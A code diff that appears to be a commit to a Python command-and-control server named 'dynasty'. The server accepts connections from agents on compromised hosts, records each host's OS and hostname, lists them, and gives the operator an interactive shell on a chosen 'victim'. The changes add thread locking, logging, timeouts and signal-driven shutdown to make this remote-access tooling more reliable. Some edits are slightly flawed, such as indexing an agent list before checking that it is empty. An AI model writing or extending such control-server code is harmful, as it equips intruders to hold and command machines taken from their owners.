@@ -1,15 +1,16 @@
 import socket
 import os
 import threading
-import time 
+import time
 import sys
 import select
-import uuid 
-import random 
+import uuid
+import random
 import signal
-import readline 
+import readline
 import requests
-import getpass 
+import getpass
+import logging
 from rich.table import Table 
 import platform 
 from rich.console import Console 
@@ -37,7 +38,14 @@ PORT = sys.argv[2]
 WEB_PORT = sys.argv[3]
 app = typer.Typer()
 conn_list = {}
+conn_lock = threading.Lock()
+shutdown_event = threading.Event()
 console = Console() 
+logging.basicConfig(
+    level=os.getenv("DYNASTY_LOG_LEVEL", "INFO").upper(),
+    format="%(asctime)s %(levelname)s %(message)s",
+)
+logger = logging.getLogger("dynasty")
 
 
 
@@ -63,12 +71,12 @@ def get_os_info(conn):
                 os_info += data
             except socket.timeout:
                 break
-        if "Linux" in os_info.decode('utf-8').strip():
+        if "Linux" in os_info.decode('utf-8', errors='replace').strip():
             return "Linux" 
         else: 
             return "Windows"
     except Exception as e:
-        print(f"Failed to get OS info: {e}")
+        logger.warning("Failed to get OS info: %s", e)
         return "Unknown"
 
 def get_hostname(conn):
@@ -95,11 +103,13 @@ def get_hostname(conn):
             except socket.timeout:
                 break
 
-        hostname = host_info.decode('utf-8').strip().split()[1]
-        return hostname 
+        hostname = host_info.decode('utf-8', errors='replace').strip().split()
+        if hostname:
+            return hostname[0]
+        return "Unknown"
 
     except Exception as e:
-        print(f"Failed to get hostname: {e}")
+        logger.warning("Failed to get hostname: %s", e)
         return "Unknown"
 
 def server(HOST, PORT):
@@ -107,18 +117,31 @@ def server(HOST, PORT):
 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+    s.settimeout(1.0)
     s.bind((HOST, PORT))
     s.listen(5)
 
     def handle_client(conn, addr):
         client_id = str(uuid.uuid4())
         os_info = get_os_info(conn)
-        host_info = get_hostname(conn) 
-        conn_list[client_id] = {"Connection": conn, "IP": addr[0], "OS": os_info, "Hostname": host_info}
+        host_info = get_hostname(conn)
+        with conn_lock:
+            conn_list[client_id] = {
+                "Connection": conn,
+                "IP": addr[0],
+                "OS": os_info,
+                "Hostname": host_info,
+            }
+        logger.info("New agent connected: %s (%s)", client_id, addr[0])
 
-    while True:
-        conn, addr = s.accept()
-        threading.Thread(target=handle_client, args=(conn, addr)).start() 
+    while not shutdown_event.is_set():
+        try:
+            conn, addr = s.accept()
+        except socket.timeout:
+            continue
+        threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()
+    s.close()
 
 def list_agents():
     global conn_list
@@ -132,8 +155,11 @@ def list_agents():
     table.add_column("Hostname", style="blue") 
     table.add_column("Character", style="yellow") 
 
-    if conn_list:
-        for client_id, client_info in conn_list.items():
+    with conn_lock:
+        agents_snapshot = dict(conn_list)
+
+    if agents_snapshot:
+        for client_id, client_info in agents_snapshot.items():
             agents += 1
             agent_char = random.choice(characters.agent_chars)
             table.add_row(str(agents), client_id, client_info["IP"], client_info["OS"], client_info["Hostname"], agent_char)
@@ -145,8 +171,9 @@ def list_agents():
 def kill_agent(agent_key):
     global conn_list
 
-    if agent_key in conn_list:
+    with conn_lock:
         agent_info = conn_list.pop(agent_key, None)
+    if agent_info:
         if agent_info:
             agent_conn = agent_info.get("Connection")
             if agent_conn:
@@ -161,10 +188,12 @@ def kill_agent(agent_key):
 
 def start_interaction(agent_num):
     global conn_list
-    if conn_list:
+    with conn_lock:
         keys = list(conn_list.keys())
-        if agent_num <= len(keys):
-            cmd_interact(conn_list[keys[agent_num - 1]]["Connection"], keys[agent_num - 1], keys[agent_num - 1])
+        agent_info = conn_list.get(keys[agent_num - 1]) if agent_num <= len(keys) else None
+    if keys:
+        if agent_info:
+            cmd_interact(agent_info["Connection"], keys[agent_num - 1], keys[agent_num - 1])
         else:
             console.log(f"{NiceColors.red}[ERROR] Invalid agent number {NiceColors.reset}")
     else:
@@ -195,7 +224,7 @@ def check_python_paths(conn):
                 found_paths.append((path, version))
 
         except Exception as e:
-            console.log(f"Failed to check {path}: {e}")
+            logger.warning("Failed to check %s: %s", path, e)
 
     return found_paths
 
@@ -293,14 +322,15 @@ def cmd_interact(conn, victim, socket_target):
 
     except Exception as e:
         console.log(f"Error: {e}")
-        del conn_list[socket_target]
+        with conn_lock:
+            conn_list.pop(socket_target, None)
 
 
 def server_status(host, web_port):
     console.log(f"[{NiceColors.green}INFO{NiceColors.reset}] Checking Web server status")
 
     web_app = f"http://{host}:{web_port}"
-    response = requests.get(web_app) 
+    response = requests.get(web_app, timeout=5)
 
     if response.ok:
         console.log(f"[{NiceColors.green}+{NiceColors.reset}] Web server active. Response code:", response.status_code)
@@ -339,9 +369,8 @@ def agents_conn():
     global conn_list
 
     agents = 0 
-    if conn_list:
-        for client_id, client_info in conn_list.items():
-            agents += 1
+    with conn_lock:
+        agents = len(conn_list)
     return agents
 
 def generate_payloads(inp_cmd):
@@ -378,7 +407,7 @@ def update_status_bar(live, agents):
 def main(host, port):
     hostname = socket.gethostname()
     username = getpass.getuser()
-    threading.Thread(target=server, args=(host, port, )).start()
+    threading.Thread(target=server, args=(host, port,), daemon=True).start()
 
     framework_version = "1.0"
     console.log(f"""
@@ -415,7 +444,7 @@ def main(host, port):
     """) 
 
     agents = 0
-    while True:
+    while not shutdown_event.is_set():
         try: 
             agents_now = agents_conn()
             if agents_now != agents:
@@ -470,6 +499,21 @@ def main(host, port):
         except Exception as e: 
             console.print(f"[red][ERROR] Code: {e}, exiting... [/]")
             sys.exit(1)
+
+def handle_shutdown(signum, frame):
+    console.log(f"[yellow]Received signal {signum}; shutting down.[/]")
+    shutdown_event.set()
+    with conn_lock:
+        for agent_info in conn_list.values():
+            conn = agent_info.get("Connection")
+            if conn:
+                try:
+                    conn.close()
+                except OSError:
+                    pass
+
+signal.signal(signal.SIGINT, handle_shutdown)
+signal.signal(signal.SIGTERM, handle_shutdown)
 
 if len(sys.argv) != 4:
     console.log(banners.help)
